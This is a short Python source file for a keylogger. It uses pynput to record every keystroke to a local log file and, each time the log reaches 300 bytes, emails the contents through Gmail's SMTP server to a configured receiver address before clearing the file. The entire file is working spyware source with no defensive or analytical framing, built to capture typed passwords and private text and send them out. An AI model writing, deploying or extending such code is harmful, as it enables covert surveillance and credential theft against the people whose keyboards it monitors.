#os for file information
import os
#pynput for keyboard input
from pynput import keyboard
#for sending mail
import smtplib
#for formatting mail
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Personal email information to send and receive data
sender_email = ""
receiver_email = ""
# password- google web app password that's required for email account to send mail
password = ""

#cleans up certain keypresses and writes them to file
def keyPressed(key):
    with open("log.txt", 'a') as f:
        try:
            k = str(key).replace("'","")
            if k == "Key.space":
                f.write(" ")
            elif k == 'Key.enter':
                f.write('\n')
            elif k == 'Key.shift_r' or k == 'Key.shift_l':
                pass
            else:            
                f.write(str(k))
        except:
            print("Character Error")
        #If file size reaches certain size (here it's 300 bytes) the log data is sent and then cleared
        if os.path.getsize("log.txt") >= 300:
            with open("log.txt", 'r') as f:
                file_content = f.read()
                send_email(file_content)
            with open('log.txt', 'w') as f:
                f.truncate(0)

#sends email of file content
def send_email(file_content):
    #Formatting the message for SMTP
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Log content"
    msg.attach(MIMEText(file_content, 'plain'))
    
    #Gmail SMTP service to send log data in an email
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, msg.as_string())
    server.quit()

#Program begins listens for keystrokes
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()